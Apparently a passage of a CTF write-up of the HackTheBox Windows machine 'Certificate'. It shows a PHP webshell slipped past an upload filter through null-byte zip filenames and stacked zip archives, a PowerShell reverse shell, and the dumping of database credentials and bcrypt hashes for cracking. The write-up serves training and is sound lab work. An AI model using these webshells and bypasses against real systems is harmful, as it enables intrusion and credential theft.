---
maquina: "Certificate"
dificultad: "Hard"
os: "Windows"
plataforma: "htb"
release: "31 May 2025"
retire: "04 Oct 2025"
creadores: "Spectra199"
htb_url: "https://hackthebox.com/machines/certificate"
app_url: "https://app.hackthebox.com/machines/663"
url: "https://0xdf.gitlab.io/2025/10/04/htb-certificate.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Certificate starts with a school website that accepts assignment uploads in limited formats that includes zip archives. I’ll show two ways to bypass the filters in PHP and upload a webshell - first with a null byte in the filename inside the zip, and then by stacking two zips together. Both of these abuse how the filesystem and PHP handle these cases differently. I’ll pivot to the next user after dumping a hash from the website DB. That user has access to a PCAP, where I’ll find a Kerberos authentication and crack it in hashcat to get the next user. I’ll exploit ESC in the ADCS environment to get the next user, and then use their membership in the Domain Storage Managers group (which gives SeManageVolumePrivilege) to get arbitrary file read on the system. The root flag is encrypted with EFS, so I’ll exfil the ADCS private key and use a Golden Certificate attack to get a shell as the Administrator user and the final flag.

## Recon

### Initial Scanning

`nmap` finds 21 open TCP ports:

```console
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.71
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-05 18:42 UTC
Nmap scan report for 10.10.11.71
Host is up (0.097s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49694/tcp open  unknown
49709/tcp open  unknown
49715/tcp open  unknown
49734/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 20.08 seconds
oxdf@hacky$ nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV 10.10.11.71
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-05 18:44 UTC
Nmap scan report for 10.10.11.71
Host is up (0.092s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Did not follow redirect to http://certificate.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-06 02:47:15Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-06T02:48:37+00:00; +8h02m47s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-06T02:48:37+00:00; +8h02m47s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-06T02:48:37+00:00; +8h02m47s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-06T02:48:37+00:00; +8h02m47s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Not valid before: 2024-11-04T03:14:54
|_Not valid after:  2025-11-04T03:14:54
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 8h02m46s, deviation: 0s, median: 8h02m46s
| smb2-time:
|   date: 2025-06-06T02:47:56
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.09 seconds
```

The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `certificate.htb`, and the hostname is `DC01`.

The webserver is redirecting to `certificate.htb` as well. I’ll fuzz for subdomains that respond differently, but not find any. I’ll use `netexec` to update my `hosts` file:

```console
oxdf@hacky$ netexec smb 10.10.11.71 --generate-hosts-file hosts
SMB         10.10.11.71     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:certificate.htb) (signing:True) (SMBv1:False)
oxdf@hacky$ cat hosts
10.10.11.71     DC01.certificate.htb certificate.htb DC01
oxdf@hacky$ cat hosts /etc/hosts | sponge /etc/hosts
```

### Website - TCP 80

#### Site

The site is for an online learning platform.

![image-20250605151545016](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605151545016.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

Almost all of the links go to the same page. There’s a newsletter field for an email, but submitting it doesn’t send anything. The nav bar links are live, showing pages for about, contact, blog, login, and registration.

The contact page has a form, and an email address, `support@certificate.htb`:

![image-20250605151845858](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605151845858.png)

Filling it out does send a POST request, but there’s no indication on the page that it’s doing anything. The about and blog pages are just filler.

The login page has a form, and the error message on failed login shows “Invalid username or password.”:

![image-20250605152035716](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605152035716.png)

The registration page allows for both student and teacher registration:

![image-20250605152127023](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605152127023.png)

It does say that after creating a teacher account, I’ll have to contact them to get it activated. On registering either, it sends me to the login page. I’m not able to register as the same username even for different types of accounts.

Trying to log in as an unverified teacher account fails, just returning an empty page (kinda janky to be honest).

#### Authenticated Site

After logging in, there’s a new Courses page, which has a carousel of four courses:

![image-20250605162009428](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605162009428.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

Each course has a details page. For example:

![image-20250930182230663](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250930182230663.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

The feedback form doesn’t submit anything, but clicking “Enroll” reloads the page with an outline toward the bottom:

![image-20250605162138699](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605162138699.png)

The Watch buttons don’t work, but the Quizz and Final ones lead to a form:

![image-20250605162218698](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605162218698.png)

It says it accepts documents and zip files containing docs. I’ll give it a dummy `.pdf` and it returns:

![image-20250605162528343](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605162528343.png)

The link goes to `/static/uploads/346f96e85d110b7cfb38fe3b00565313/dummy.pdf`. If I put that same file into a zip archive and upload it, the resulting file is still the unzipped `.pdf`.

#### Tech Stack

On first visiting the site, the HTTP response headers set a `PHPSESSID` cookie:

```http
HTTP/1.1 200 OK
Date: Fri, 06 Jun 2025 03:09:44 GMT
Server: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
X-Powered-By: PHP/8.0.30
Set-Cookie: PHPSESSID=uavhbd3clbn7jajc5dbcm33lrs; path=/; HttpOnly
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8
Content-Length: 22420
```

All the page extensions are `.php` as well. This is a PHP website.

The 404 page is the [default Apache 404](https://0xdf.gitlab.io/cheatsheets/404#apache--httpd) (mentioning PHP as well):

![image-20250605163421264](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605163421264.png)

#### Directory Brute Force

I’ll run `feroxbuster` against the site, and include `-x php` since I know the site is PHP and a lowercase wordlist since this is Windows:

```console
oxdf@hacky$ feroxbuster -u http://certificate.htb -x php --dont-extract-links -w /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://certificate.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-medium-directories-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       33w      301c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       30w      304c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      582l     1643w    22420c http://certificate.htb/
302      GET        0l        0w        0c http://certificate.htb/logout.php => login.php
200      GET      256l      786w    10916c http://certificate.htb/register.php
200      GET      230l      663w     9412c http://certificate.htb/login.php
302      GET        0l        0w        0c http://certificate.htb/upload.php => login.php
200      GET      565l     1566w    21940c http://certificate.htb/blog.php
200      GET        0l        0w        0c http://certificate.htb/db.php
301      GET        9l       30w      343c http://certificate.htb/static => http://certificate.htb/static/
200      GET      372l     1136w    14826c http://certificate.htb/about.php
200      GET      263l      754w    10605c http://certificate.htb/contacts.php
301      GET        9l       30w      346c http://certificate.htb/static/js => http://certificate.htb/static/js/
301      GET        9l       30w      347c http://certificate.htb/static/css => http://certificate.htb/static/css/
301      GET        9l       30w      347c http://certificate.htb/static/img => http://certificate.htb/static/img/
200      GET      582l     1643w    22420c http://certificate.htb/index.php
403      GET       11l       47w      423c http://certificate.htb/phpmyadmin
301      GET        9l       30w      351c http://certificate.htb/static/uploads => http://certificate.htb/static/uploads/
301      GET        9l       30w      349c http://certificate.htb/static/fonts => http://certificate.htb/static/fonts/
200      GET       46l      106w     1848c http://certificate.htb/header.php
200      GET       71l      231w     2955c http://certificate.htb/footer.php
503      GET       11l       44w      404c http://certificate.htb/examples
302      GET        0l        0w        0c http://certificate.htb/courses.php => login.php
301      GET        9l       30w      352c http://certificate.htb/static/img/blog => http://certificate.htb/static/img/blog/
301      GET        9l       30w      353c http://certificate.htb/static/js/vendor => http://certificate.htb/static/js/vendor/
403      GET       11l       47w      423c http://certificate.htb/licenses
403      GET       11l       47w      423c http://certificate.htb/server-status
301      GET        9l       30w      356c http://certificate.htb/static/img/elements => http://certificate.htb/static/img/elements/
[####################] - 3m    265840/265840  0s      found:26      errors:173745
[####################] - 2m     26584/26584   180/s   http://certificate.htb/
[####################] - 2m     26584/26584   179/s   http://certificate.htb/static/
[####################] - 3m     26584/26584   170/s   http://certificate.htb/static/js/
[####################] - 3m     26584/26584   157/s   http://certificate.htb/static/css/
[####################] - 3m     26584/26584   167/s   http://certificate.htb/static/img/
[####################] - 2m     26584/26584   178/s   http://certificate.htb/static/uploads/
[####################] - 2m     26584/26584   181/s   http://certificate.htb/static/fonts/
[####################] - 3m     26584/26584   167/s   http://certificate.htb/static/img/blog/
[####################] - 3m     26584/26584   173/s   http://certificate.htb/static/js/vendor/
[####################] - 2m     26584/26584   181/s   http://certificate.htb/static/img/elements/
```

Nothing really interesting here.

## Shell as xamppuser

### Enumerating Uploads

#### Multiple Files

I’ll try a bunch of things to see how the site handles them. First, I’ll put two PDF docs into a zip:

```console
oxdf@hacky$ zip double.zip dummy.pdf dummy2.pdf
updating: dummy.pdf (deflated 7%)
  adding: dummy2.pdf (deflated 7%)
oxdf@hacky$ unzip -l double.zip
Archive:  double.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    13264  2025-06-05 20:27   dummy.pdf
    13264  2025-06-05 20:27   dummy2.pdf
---------                     -------
    26528                     2 files
```

Uploading this just returns a blank page.

#### Content-Type

If I copy `dummy.pdf` to `dummy.php`, I can check how the site is filtering:

```console
oxdf@hacky$ file dummy.pdf
dummy.pdf: PDF document, version 1.4, 1 page(s) (zip deflate encoded)
oxdf@hacky$ cp dummy.pdf dummy.php
```

On uploading, it shows:

![image-20250605164347470](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605164347470.png)

Looking at the HTTP POST request, it shows that the MIME type is set to `application/x-php`:

```http
POST /upload.php?s_id=19 HTTP/1.1
Host: certificate.htb
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=----geckoformboundarye373b5535a184a3ba1ccfd0dc34a59b3
Content-Length: 13757
Origin: http://certificate.htb
Connection: keep-alive
Referer: http://certificate.htb/upload.php?s_id=19
Cookie: PHPSESSID=uavhbd3clbn7jajc5dbcm33lrs
Upgrade-Insecure-Requests: 1
Priority: u=0, i

------geckoformboundarye373b5535a184a3ba1ccfd0dc34a59b3
Content-Disposition: form-data; name="info"

Learn Angular JS Course for Legendary Persons - Quizz-1
------geckoformboundarye373b5535a184a3ba1ccfd0dc34a59b3
Content-Disposition: form-data; name="quizz_id"

19
------geckoformboundarye373b5535a184a3ba1ccfd0dc34a59b3
Content-Disposition: form-data; name="file"; filename="dummy.php"
Content-Type: application/x-php

%PDF-1.4
%Ã¤Ã¼Ã¶Ã<9f>
2 0 obj
<</Length 3 0 R/Filter/FlateDecode>>
stream
...[snip]...
```

This must be done in the browser. So it’s clear that the `Content-Type` in the form data matters. That’s easily changed in a proxy.

#### File Extension

If I put the same `dummy.php` into a zip and upload, the error changes:

![image-20250605164630238](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605164630238.png)

This time the POST form data `Content-Type` is `application/zip`, but it must be checking the extension on unzip.

#### Mime Type

The server could also be checking that the mime type of the file matches a valid type. This would be checking the file [magic bytes](https://en.wikipedia.org/wiki/List_of_file_signatures) similar to what the `file` command does. I’ll try uploading a `.pdf` file with PHP only inside:

```console
oxdf@hacky$ echo '<?php system($_REQUEST["cmd"]); ?>' > shell.pdf
```

It gets blocked:

![image-20250605165631029](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605165631029.png)

The same result happens inside the zip. This could be a mime check, or it could be a check for bad strings.

I’ll copy the PDF to a new file and edit it with `vim`:

![image-20250606095936520](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606095936520.png)

I’ve put the PHP webshell into a stream, so this is still a completely legit PDF (even if the stream will not decode to something unintelligible). This one uploads just fine, though as expected the PDF doesn’t display right.

#### Longer Paths

I can make an archive with a path in it to see how that matters:

```console
oxdf@hacky$ zip path.zip ~/Downloads/dummy.pdf
  adding: home/oxdf/Downloads/dummy.pdf (deflated 7%)
oxdf@hacky$ unzip -l path.zip
Archive:  path.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    13264  2025-06-05 20:24   home/oxdf/Downloads/dummy.pdf
---------                     -------
    13264                     1 file
```

This actually uploads just fine, with the resulting file being at `/static/uploads/346f96e85d110b7cfb38fe3b00565313/home/oxdf/Downloads/dummy.pdf`.

Trying to visit any of the directories returns 403 forbidden.

### via Null Byte Injection

#### Strategy

I can get a PHP webshell onto Certificate if I put it in a valid PDF. Still, for that to be executed, I need to have it upload with a PHP extension. I could try other extensions (like `.php5`), but this seems like a clear case of an allow list.

Because I have the ability to provide a zip, and I’ve already seen that the site basically respects whatever is in the zip, I’ll try a null byte injection by setting the name of the file to something like `shell.php\x00.pdf` inside the zip. Then, when it’s unzipped, it may get written to disk as `shell.php`, in which case I’ve got a webshell.

#### Create

I’ll take my PDF with PHP in it and make a copy with two periods and put it in a zip:

```console
oxdf@hacky$ cp embedded.pdf shell.php..pdf
oxdf@hacky$ zip null.zip shell.php..pdf
  adding: shell.php..pdf (deflated 7%)
oxdf@hacky$ unzip -l null.zip
Archive:  null.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    13299  2025-06-05 21:16   shell.php..pdf
---------                     -------
    13299                     1 file
```

I’ll open `null.zip` in a hex editor (I’m using `hexcurse`):

![image-20250605171937187](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250605171937187.png)

The first bit of metadata about the file (including the filename as a string) is at the top. I’ll find the first `.` and change it to a null byte. There’s another at the bottom:

![image-20250606100109363](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606100109363.png)

I’ve changed both to nulls. My local `unzip` shows this as just `nulls.php`:

```console
oxdf@hacky$ unzip -l nulls.zip
Archive:  nulls.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
    13299  2025-06-06 13:55   embedded.php
---------                     -------
    13299                     1 file
```

However, I can check with php:

```console
oxdf@hacky$ php -a
Interactive shell

php > $zip = new ZipArchive();
php > $zip->open('nulls.zip');
php > echo $zip->count();
1
php > echo $zip->getNameIndex(0);
embedded.php .pdf
```

It seems to think the file ends with `.pdf`!

#### Upload

Uploading this shows success:

![image-20250606100950778](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606100950778.png)

The link goes to `/static/uploads/346f96e85d110b7cfb38fe3b00565313/embedded.php%20.pdf`. Clicking on this returns 404. However, going to `embedded.php` works:

![image-20250606101037655](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606101037655.png)

I’ll add `?cmd=whoami` and it executes:

![image-20250606101139250](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606101139250.png)

### via Stacked Zips

#### Strategy

Another trick that was discovered was to stack multiple zip archives together. Different parses will handle differently two zips back to back. For example, I’ll create three archives:

```console
oxdf@hacky$ echo "test" > test1
oxdf@hacky$ echo "test2" > test2
oxdf@hacky$ zip zip1.zip test1
  adding: test1 (stored 0%)
oxdf@hacky$ zip zip2.zip test2
  adding: test2 (stored 0%)
oxdf@hacky$ cat zip1.zip zip2.zip > zip_combined.zip
```

`unzip` shows only the second:

```console
oxdf@hacky$ unzip -l zip_combined.zip
Archive:  zip_combined.zip
warning [zip_combined.zip]:  165 extra bytes at beginning or within zipfile
  (attempting to process anyway)
  Length      Date    Time    Name
---------  ---------- -----   ----
        6  2025-06-06 14:12   test2
---------                     -------
        6                     1 file
```

PHP shows only the first:

```console
oxdf@hacky$ php -a
Interactive shell

php > $zip = new ZipArchive();
php > $zip->open('zip_combined.zip');
php > echo $zip->count();
1
php > echo $zip->getNameIndex(0);
test1
```

If the PHP checks the first and decides it’s valid, but then it gets unpacked differently, perhaps I can get a `.php` file into Certificate.

#### Create

I’ll make two zips:

```console
oxdf@hacky$ zip nice.zip dummy.pdf
  adding: dummy.pdf (deflated 7%)
oxdf@hacky$ zip evil.zip embedded.php
  adding: shell.php (stored 0%)
oxdf@hacky$ cat nice.zip evil.zip > combined.zip
```

I’m using the legit PDF as well as the PDF with the webshell embedded in it, this time named `embedded.php`. If I just used a straight PHP webshell, it did upload, but it gets eaten by Defender on first access.

#### Upload

I’ll give the site `combined.zip`, and it returns `/static/uploads/346f96e85d110b7cfb38fe3b00565313/dummy.pdf`. Clicking the link, it’s not actually there (assuming it wasn’t there from a previous upload). But if `embedded.php` is:

![image-20250606103814783](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20250606103814783.png)

### Shell

I’ll grab the base64 PowerShell one line reverse shell from [revshells.com](https://www.revshells.com/) and paste it in as the command. At my listening `nc` there’s a shell:

```console
oxdf@hacky$ sudo rlwrap -cAr nc -lvnp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.71 56941

PS C:\xampp\htdocs\certificate.htb\static\uploads\346f96e85d110b7cfb38fe3b00565313>
```

## Shell as Sara.B

### Enumeration

#### Users

There are several users with home directories on Certificate:

```console
PS C:\users> dir

    Directory: C:\users

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/30/2024   8:33 PM                Administrator
d-----       11/23/2024   6:59 PM                akeder.kh
d-----        11/4/2024  12:55 AM                Lion.SK
d-r---        11/3/2024   1:05 AM                Public
d-----        11/3/2024   7:26 PM                Ryan.K
d-----       11/26/2024   4:12 PM                Sara.B
d-----       12/29/2024   5:30 PM                xamppuser
```

As xamppuser, there’s not anything of interest.

There are even more user accounts on the domain:

```console
PS C:\users> net user

User accounts for \\DC01

-------------------------------------------------------------------------------
Administrator            akeder.kh                Alex.D
Aya.W                    Eva.F                    Guest
John.C                   Kai.X                    kara.m
karol.s                  krbtgt                   Lion.SK
Maya.K                   Nya.S                    Ryan.K
saad.m                   Sara.B                   xamppuser
The command completed successfully.
```

#### Web

The website is homed in `\xampp\htdocs\certificate.htb`:

```console
PS C:\xampp\htdocs\certificate.htb> ls

    Directory: C:\xampp\htdocs\certificate.htb

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----       12/26/2024   1:49 AM                static
-a----       12/24/2024  12:45 AM           7179 about.php
-a----       12/30/2024   1:50 PM          17197 blog.php
-a----       12/30/2024   2:02 PM           6560 contacts.php
-a----       12/24/2024   6:10 AM          15381 course-details.php
-a----       12/24/2024  12:53 AM           4632 courses.php
-a----       12/23/2024   4:46 AM            549 db.php
-a----       12/22/2024  10:07 AM           1647 feature-area-2.php
-a----       12/22/2024  10:22 AM           1331 feature-area.php
-a----       12/22/2024  10:16 AM           2955 footer.php
-a----       12/23/2024   5:13 AM           2351 header.php
-a----       12/24/2024  12:52 AM           9497 index.php
-a----       12/25/2024   1:34 PM           5908 login.php
-a----       12/23/2024   5:14 AM            153 logout.php
-a----       12/24/2024   1:27 AM           5321 popular-courses-area.php
-a----       12/25/2024   1:27 PM           8240 register.php
-a----         6/6/2025   2:47 PM          10390 upload.php
```

`db.php` has the database connection info:

```php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

It’s connecting to MySQL on localhost with the given creds.

#### Database

There is a `mysql.exe` binary in the `xampp` directories:

```console
PS C:\> dir \xampp\mysql\bin\mysql.exe

    Directory: C:\xampp\mysql\bin

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----       10/30/2023   5:58 AM        3784616 mysql.exe
```

My shell is not robust enough to run commands interactively, but I can run a single command:

```console
PS C:\> \xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e "show databases;"
Database
certificate_webapp_db
information_schema
test
```

`certificate_webapp_db` is the most interesting. I’ll list the tables:

```console
PS C:\> \xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e "use certificate_webapp_db; show tables"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses
```

I’ll dump the `users` table:

```console
PS C:\> \xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e "use certificate_webapp_db; select * from users;"
id      first_name      last_name       username        email   password        created_at      role    is_active
1       Lorra   Armessa Lorra.AAA       lorra.aaa@certificate.htb       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG  2024-12-23 12:43:10     teacher 1
6       Sara    Laracrof        Sara1200        sara1200@gmail.com      $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK  2024-12-23 12:47:11     teacher 1
7       John    Wood    Johney  johny009@mail.com       $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq 2024-12-23 13:18:18      student 1
8       Havok   Watterson       havokww havokww@hotmail.com     $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti  2024-12-24 09:08:04     teacher 1
9       Steven  Roman   stev    steven@yahoo.com        $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2 2024-12-24 12:05:05      student 1
10      Sara    Brawn   sara.b  sara.b@certificate.htb  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6 2024-12-25 21:31:26      admin   1
12      0xdf    0xdf    0xdf    0xdf@certificate.htb    $2y$04$BLfqCXF7yp6UaAnL4O6qzec4/a3sKC.dPPdDsZhuZi0SRVPYqOVSC 2025-06-05 20:24:17      student 1
14      0xdff   0xdf    0xdf2   0xdf2@certificate.htb   $2y$04$J1olidIy26NPf49/1X3gVuMelp29AJOBx6y5nC5RRGj1jELmCZwje 2025-06-05 20:25:08      teacher 0
```

I’ll collect just the hashes, and ignore the ones I created:

```console
PS C:\> \xampp\mysql\bin\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -e "use certificate_webapp_db; select username,password from users;"
username        password
Lorra.AAA       $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
Sara1200        $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
Johney  $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
havokww $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
stev    $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
sara.b  $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
0xdf    $2y$04$BLfqCXF7yp6UaAnL4O6qzec4/a3sKC.dPPdDsZhuZi0SRVPYqOVSC
0xdf2   $2y$04$J1olidIy26NPf49/1X3gVuMelp29AJOBx6y5nC5RRGj1jELmCZwje
0xdfteacher     $2y$04$mjwK7UmPGc4gg.tcUH3.3.OHeeHFHZa05o0iE.4dZy4IWsbA0qiC2
```

### Shell

#### Crack Hashes

I’ll make a file of the hashes I want to crack:

```plaintext
Lorra.AAA:$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG
Sara1200:$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK
Johney:$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq
havokww:$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti
stev:$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2
sara.b:$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
```

I’ll pass it to `hashcat`:

```console
$ hashcat web.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user
hashcat (v6.2.6) starting in autodetect mode
...[snip]...
The following 4 hash-modes match the structure of your input hash:

      # | Name                                                       | Category

======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce

Please specify the hash-mode with -m [hash-mode].
...[snip]...
```

It needs me to specify the hash type. No reason to think it’s anything other than plain bcrypt, so I’ll start there. I could test this on one of my hashes to make sure.

One hash breaks very quickly:

```console
$ hashcat web.hashes /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt --user -m 3200
hashcat (v6.2.6) starting
...[snip]...
